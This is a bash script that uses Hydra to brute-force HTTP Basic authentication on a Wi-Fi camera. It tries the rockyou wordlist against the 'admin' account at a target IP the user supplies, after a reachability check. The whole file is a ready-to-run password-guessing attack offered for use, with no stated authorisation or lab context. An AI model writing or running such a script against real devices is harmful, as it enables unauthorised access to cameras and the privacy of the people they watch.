#!/bin/bash
# =============================================================================
# Hydra Brute-Force Script for Wi-Fi Camera HTTP Authentication
# =============================================================================
# Usage: chmod +x hydra-bruteforce.sh && ./hydra-bruteforce.sh <TARGET_IP>
# =============================================================================

set -euo pipefail

TARGET_IP="${1:?Usage: $0 <TARGET_IP>}"
USERNAME="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
THREADS=16
PORT=80

echo "[*] Target:    ${TARGET_IP}:${PORT}"
echo "[*] Username:  ${USERNAME}"
echo "[*] Wordlist:  ${WORDLIST}"
echo "[*] Threads:   ${THREADS}"
echo ""

# Verify target is reachable
if ! ping -c 1 -W 2 "${TARGET_IP}" &>/dev/null; then
    echo "[!] Target ${TARGET_IP} is not reachable. Exiting."
    exit 1
fi

# Verify wordlist exists
if [ ! -f "${WORDLIST}" ]; then
    echo "[!] Wordlist not found at ${WORDLIST}"
    echo "[*] Attempting to decompress rockyou.txt.gz..."
    if [ -f "${WORDLIST}.gz" ]; then
        sudo gunzip -k "${WORDLIST}.gz"
    else
        echo "[!] rockyou.txt.gz not found. Provide a valid wordlist."
        exit 1
    fi
fi

echo "[*] Starting HTTP Basic Auth brute-force..."
echo "-------------------------------------------"

hydra -l "${USERNAME}" -P "${WORDLIST}" \
    "${TARGET_IP}" http-get / \
    -s "${PORT}" -t "${THREADS}" -f -V

echo ""
echo "[*] Brute-force complete."
